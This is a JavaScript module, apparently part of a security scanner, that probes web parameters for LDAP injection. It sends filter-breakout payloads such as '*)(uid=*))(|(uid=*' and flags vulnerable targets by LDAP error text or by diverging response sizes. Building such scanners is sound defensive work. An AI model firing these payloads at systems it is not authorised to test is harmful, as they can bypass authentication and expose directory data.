// Dark Matter rule-based scanner — LDAP injection probe.
//
// Payloads close / reopen the LDAP filter and widen it:
//   *                    (wildcard — returns everything the filter can see)
//   )(uid=*))(|(uid=*    (classic filter-breakout, boolean TRUE)
//   admin)(uid=*         (prefix breakout)
//
// Oracle (differential):
//   1. Boolean: benign `param=<unlikely>` vs `param=*)(uid=*))(|(uid=*` —
//      the breakout must return a DIFFERENT result set (diverged).
//   2. Error: LDAP error text ("LDAP:", "javax.naming", "Invalid DN",
//      "LDAPException") on the malicious input, absent on benign.
//
// class 'ldap_injection' → default protocol → signalCorrelated=true
// (boolean variant also sets diverged=true for the evidence trail).
// Severity: high.
import { randomBytes } from 'node:crypto';

const UA = 'DarkMatter-Scanner/1.0 (+authorized-scan)';

const LDAP_ERRORS = /ldap[:\s]|javax\.naming|invalid dn|ldapexception|protocol error.*ldap/i;

async function get(url, opts = {}) {
  const ctrl = new AbortController();
  const t = setTimeout(() => ctrl.abort(), opts.timeoutMs || 15000);
  try {
    const res = await fetch(url, { signal: ctrl.signal, headers: { 'User-Agent': UA, ...(opts.headers || {}) } });
    const text = await res.text().catch(() => '');
    return { status: res.status, text: text.slice(0, 200000) };
  } finally {
    clearTimeout(t);
  }
}

function withParam(url, name, value) {
  const u = new URL(url);
  u.searchParams.set(name, value);
  return u.toString();
}

const BREAKOUTS = ['*)(uid=*))(|(uid=*', '*', 'admin)(uid=*'];

export async function probeLdapInjection(url, params, opts = {}) {
  const findings = [];
  for (const param of params.slice(0, 10)) {
    const unlikely = `dmldap${randomBytes(3).toString('hex')}`;
    let benign;
    try {
      benign = await get(withParam(url, param, unlikely), opts);
    } catch {
      continue;
    }
    for (const payload of BREAKOUTS) {
      let malicious;
      try {
        malicious = await get(withParam(url, param, payload), opts);
      } catch {
        continue;
      }
      if (LDAP_ERRORS.test(malicious.text) && !LDAP_ERRORS.test(benign.text)) {
        findings.push({
          class: 'ldap_injection',
          id: `ldapi-error-${param}`,
          title: `LDAP injection (error) in parameter '${param}'`,
          severity: 'high',
          url,
          param,
          parameter: param,
          evidence: {
            request: `GET ${withParam(url, param, payload)}`,
            response: 'LDAP error text on filter-breakout input; absent on benign input',
            impact_demo: 'input reached the LDAP filter compiler — filter logic is attacker-controlled',
            signalCorrelated: true,
          },
        });
        break;
      }
      const delta = Math.abs(malicious.text.length - benign.text.length);
      if (delta > Math.max(benign.text.length, 500) * 0.25 && delta > 200) {
        findings.push({
          class: 'ldap_injection',
          id: `ldapi-bool-${param}`,
          title: `LDAP injection (filter breakout) in parameter '${param}'`,
          severity: 'high',
          url,
          param,
          parameter: param,
          evidence: {
            request: `GET ${withParam(url, param, payload)} vs benign`,
            response: `result set diverged by ${delta} chars — wildcard/breakout widened the filter`,
            impact_demo: 'filter breakout returned entries the benign query hid — auth bypass primitive',
            diverged: true,
            signalCorrelated: true,
          },
        });
        break;
      }
    }
  }
  return findings;
}
